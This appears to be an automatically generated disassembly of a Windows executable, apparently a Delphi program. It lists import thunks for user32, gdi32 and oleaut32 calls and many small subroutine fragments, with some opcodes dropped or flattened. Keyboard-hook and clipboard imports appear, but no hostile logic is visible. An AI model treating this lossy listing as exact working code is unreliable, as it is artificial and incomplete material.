jmp [ __import_lookup_table_8(gdi32:UnrealizeObject) ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CloseClipboard
jmp [ CloseClipboard@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
DrawStateA
jmp [ DrawStateA@IAT ]
EmptyClipboard
jmp [ EmptyClipboard@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDlgItem
jmp [ GetDlgItem@IAT ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
HideCaret
jmp [ __import_lookup_table_9(user32:HideCaret) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsCharAlphaNumericA
jmp [ IsCharAlphaNumericA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBeep
jmp [ MessageBeep@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
OpenClipboard
jmp [ __import_lookup_table_9(user32:OpenClipboard) ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetKeyboardState
jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCaret
jmp [ ShowCaret@IAT ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406c9c
call GetTickCount
retn
sub_406ca4
xchg edx eax
call sub_4028c8
retn
sub_406cac
xor eax eax
retn
sub_406cb0
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406cc0
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406cdc
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406cf0
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406d18
retn
sub_406d1c
shr eax 0x8
retn
sub_406d20
shr eax 0x10
retn
sub_406d50
call sub_406c90
retn
sub_406d58
call sub_406c90
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406f35
jmp sub_403a3c
sub_406f3c
pop ebp
retn
sub_406f40
sub [ rw-data ] 0x1
retn
sub_406f6d
jmp sub_403a3c
sub_406f74
pop ebp
retn
sub_406f78
sub [ rw-data ] 0x1
retn
sub_407285
jmp sub_403a3c
sub_40728c
pop ebp
retn
sub_407290
sub [ rw-data ] 0x1
retn
sub_4072ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_407d89
add eax 0xffffffd4
jmp sub_40d330
sub_407d91
add eax 0xffffffd4
jmp sub_40d3cc
sub_407da3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a08
sub_407dad
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a1c
sub_408144
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40810c
test eax eax
sete al
pop esi
pop ebx
retn
sub_4086c2
jmp sub_403a3c
sub_4086c9
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4086d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40865c
pop esi
pop ebx
retn
sub_408760
call sub_40873c
retn
sub_4087f8
push eax
call CloseHandle
retn
sub_408868
push ebx
mov ebx eax
mov eax ebx
call sub_408800
inc eax
setne al
pop ebx
retn
sub_408878
push ebx
mov ebx eax
mov eax ebx
call sub_4044f8
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_408a58
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408a6c
push esi
mov esi eax
xchg edx eax
call sub_4028c8
mov eax esi
pop esi
retn
sub_408c2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404230
pop esi
pop ebx
retn
sub_408c40
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026cc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408c54
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408c8c
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026ec
sub_408cf4
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402828
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408d18
push ebx
mov ebx eax
mov eax ebx
call sub_404038
pop ebx
retn
sub_40907b
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404038
pop eax
pop ebx
retn
sub_409333
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40948e
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4097eb
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4097eb
sub_4098a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044f8
mov edx esi
xor ecx ecx
call sub_409734
pop esi
pop ebx
retn
sub_40991c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044f8
mov edx esi
mov cl 0x1
call sub_409734
pop esi
pop ebx
retn
sub_409f96
jmp sub_403a3c
sub_409f9d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a08e
jmp sub_403a3c
sub_40a095
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a839
jmp sub_403a3c
sub_40a840
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a8c8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a86c
pop ebp
retn 0x8
sub_40aa0d
jmp sub_403a3c
sub_40aa14
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40aeb7
jmp sub_403a3c
sub_40aebe
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b3d7
jmp sub_403a3c
sub_40b3de
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b489
jmp sub_403a3c
sub_40b490
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b515
mov ah 0x40
add al ch
stosd [ edi ]
lodsd [ esi ]
sub_40b533
jmp sub_403a3c
sub_40b53a
pop esi
pop ecx
pop ebp
retn
sub_40b716
jmp sub_403a3c
sub_40b71d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b774
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40ba66
jmp sub_403a3c
sub_40bb34
jmp sub_403a3c
sub_40bb5c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_40325c
sub_40bcf8
jmp sub_403a3c
sub_40bcff
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd08
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403a74
sub_40bd15
retn
sub_40bd18
push ebp
mov ebp esp
call sub_40bc5c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bd08
pop ebp
retn 0x4
sub_40bd34
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
retn
sub_40bdcc
push ebx
mov ebx eax
mov eax ebx
call sub_40bd4c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bf9f
jmp sub_403a3c
sub_40bfa6
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c06b
jmp sub_403a3c
sub_40c072
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c07c
call sub_40b908
mov eax 0x1
call sub_404020
sub_40c200
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c2d9
jmp sub_403a3c
sub_40c2f6
jmp sub_403a3c
sub_40c2fd
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c30c
push 0x0
call MessageBeep
retn
sub_40c3b0
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c314
mov ecx eax
sub_40c59c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c5bc
push eax
call CharNextA
retn
sub_40c8e4
jmp sub_403a3c
sub_40c8eb
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c954
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cdab
jmp sub_403a3c
sub_40cdb2
pop ebx
mov esp ebp
pop ebp
retn
sub_40cf7b
jmp sub_403a3c
sub_40cf82
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ Sleep@IAT ]
sub_40d024
jmp sub_403a3c
sub_40d02b
pop ebx
mov esp ebp
pop ebp
retn
sub_40d030
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cf94
sub_40d040
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d05c
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026ec
pop ebx
retn
sub_40d0e4
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d0f0
xchg [ eax ] edx
mov eax edx
retn
sub_40d150
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d1e0
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d2f8
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d320
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d59b
jmp sub_403a3c
sub_40d5a2
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d610
jmp sub_403a3c
sub_40d617
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d635
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d62e
jmp sub_403a3c
sub_40d635
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40da84
retn
sub_40da85
jmp sub_403a3c
j_sub_40da84
jmp sub_40da84
sub_40da8c
pop ebp
retn
sub_40daf8
jmp sub_403a3c
sub_40daff
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40db78
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40dbde
jmp sub_403a3c
sub_40dbe5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc4a
jmp sub_403a3c
sub_40dc51
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcb6
jmp sub_403a3c
sub_40dcbd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dd22
jmp sub_403a3c
sub_40dd29
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dd8e
jmp sub_403a3c
sub_40dd95
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40de0d
jmp sub_403a3c
sub_40de14
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40de80
jmp sub_403a3c
sub_40de87
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40def0
jmp sub_403a3c
sub_40def7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40df64
jmp sub_403a3c
sub_40df6b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40e2f1
jmp sub_403a3c
sub_40e2f8
pop ebp
retn
sub_40e2fc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dfc0
sub_40e30d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e996
jmp sub_403a3c
sub_40ea2f
jmp sub_403a3c
sub_40ea36
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ea86
jmp sub_403a3c
sub_40ea8d
pop ecx
pop ebp
retn
sub_40eada
jmp sub_403a3c
sub_40eae1
pop ecx
pop ebp
retn
sub_40eb73
jmp sub_403a3c
sub_40eb7a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ebca
jmp sub_403a3c
sub_40ebd1
pop ecx
pop ebp
retn
sub_40ee19
jmp sub_403a3c
sub_40ee20
pop ebx
mov esp ebp
pop ebp
retn
sub_40ef36
jmp sub_403a3c
sub_40ef3d
pop ecx
pop ebp
retn
sub_40ef40
push ebx
mov ebx eax
mov eax ebx
call sub_40f1d8
mov [ ebx ] 0x1
pop ebx
retn
sub_40f1ec
push eax
call sub_40f1d8
pop eax
retn
sub_40f44c
call sub_40f500
retn
sub_40f5a0
jmp sub_403a3c
sub_40f5a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f5ee
jmp sub_403a3c
sub_40f5f5
pop ebx
pop ecx
pop ebp
retn
sub_40f63a
jmp sub_403a3c
sub_40f641
pop ebx
pop ecx
pop ebp
retn
sub_40f686
jmp sub_403a3c
sub_40f68d
pop ebx
pop ecx
pop ebp
retn
sub_40f6d2
jmp sub_403a3c
sub_40f6d9
pop ebx
pop ecx
pop ebp
retn
sub_40fa9b
jmp sub_403a3c
sub_40faa2
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb3c
jmp sub_403a3c
sub_40fb43
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40ffb1
jmp sub_403788
sub_41006c
jmp sub_403788
sub_410113
jmp sub_403788
sub_41020c
jmp sub_403788
sub_4102e5
jmp sub_403788
sub_4103cd
jmp sub_403788
sub_41058a
jmp sub_403a3c
sub_410591
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4105f3
jmp sub_403a3c
sub_4105fa
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410a60
jmp sub_403788
sub_410b4f
jmp sub_403a3c
sub_410b56
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410bf4
jmp sub_403a3c
sub_410bfb
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410f98
call sub_410c50
neg al
sbb eax eax
neg eax
retn
sub_411059
jmp sub_403a3c
sub_411060
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411109
jmp sub_403a3c
sub_411110
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411661
jmp sub_403788
sub_411768
jmp sub_403a3c
sub_41176f
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411879
jmp sub_403a3c
sub_411880
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411cd0
jmp sub_403a3c
sub_411cd7
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411de1
jmp sub_403a3c
sub_411de8
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41232e
jmp sub_403a3c
sub_412335
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4123d9
jmp sub_403a3c
sub_4123e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412402
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40475c
retn
sub_4123fb
jmp sub_403a3c
sub_412402
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41245e
jmp sub_403a3c
sub_412465
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4124e1
jmp sub_403a3c
sub_412a27
jmp sub_403a3c
sub_412a2e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412ac1
jmp sub_403a3c
sub_412ac8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ae5
lea eax [ ebp - 0x14 ]
call sub_404744
retn
sub_412ade
jmp sub_403a3c
sub_412ae5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412b42
jmp sub_403a3c
sub_412b49
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412beb
jmp sub_403a3c
sub_412c08
jmp sub_403a3c
sub_412c0f
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41316a
jmp sub_403a3c
sub_413171
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4131e2
jmp sub_403a3c
sub_4131e9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413574
push eax
call sub_40f1d8
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413588
push eax
call sub_40f1d8
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413713
jmp sub_403a3c
sub_41373f
jmp sub_403a3c
sub_413746
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413973
jmp sub_403a3c
sub_41397a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413c1b
jmp sub_403a3c
sub_413ca9
jmp sub_403a3c
sub_413d99
jmp sub_403a3c
sub_413e3b
jmp sub_403a3c
sub_413ef1
jmp sub_403a3c
sub_413f98
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f500
add esp 0x10
sub_414242
jmp sub_403a3c
sub_414249
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41428c
mov ax [ eax ]
retn
sub_41438c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f1d8
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4143a4
mov edx 0x80020004
call sub_41438c
retn
sub_4143f4
mov dl 0x1
call sub_4143fc
retn
sub_4144a9
jmp sub_403a3c
sub_4144b0
pop esi
pop ebx
pop ebp
retn
sub_4144b4
push ebp
mov ebp esp
call sub_414674
pop ebp
retn 0x4
sub_414540
push ebp
mov ebp esp
call sub_414674
pop ebp
retn 0x4
sub_414623
jmp sub_403a3c
sub_41462a
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403298
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40365c
sub_41464c
xor eax eax
retn
sub_414650
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414664
mov [ ecx ] 0x8
mov al 0x1
retn
sub_41466c
call sub_40e94c
retn
sub_414674
call sub_40ea3c
retn
sub_41467c
call sub_40eeec
retn
sub_414684
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414698
call sub_414674
retn
sub_4146a0
push ebp
mov ebp esp
call sub_41467c
pop ebp
retn 0x8
sub_4146b8
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414794
jmp sub_403a3c
sub_41485d
jmp sub_403a3c
sub_414864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414881
lea eax [ ebp - 0x10 ]
call sub_404038
retn
sub_41487a
jmp sub_403a3c
sub_414881
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41488c
call sub_40ef40
retn
sub_414894
mov ecx 0xe
call sub_413f30
cmp al 0x1
retn
sub_414913
jmp sub_403a3c
sub_41491a
pop ebp
retn
sub_4149bd
jmp sub_403a3c
sub_4149c4
pop ebp
retn
sub_414add
jmp sub_403a3c
sub_414ae4
pop ebp
retn
sub_414ae8
sub [ rw-data ] 0x1
retn
sub_414be6
jmp sub_403a3c
sub_414bed
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414f0c
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_414e74
mov eax ebx
mov edx esp
call sub_40429c
add esp 0x100
pop ebx
retn
sub_414f68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
sub_415044
jmp sub_403a3c
sub_41504b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41509c
jmp sub_403a3c
sub_4150a3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4151f0
jmp sub_403a3c
sub_4151f7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4152c6
jmp sub_403a3c
sub_4152cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4155e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f500
pop esi
pop ebx
retn
sub_41588e
jmp sub_403a3c
sub_415895
pop ebp
retn
sub_415898
sub [ rw-data ] 0x1
retn
CoInitialize
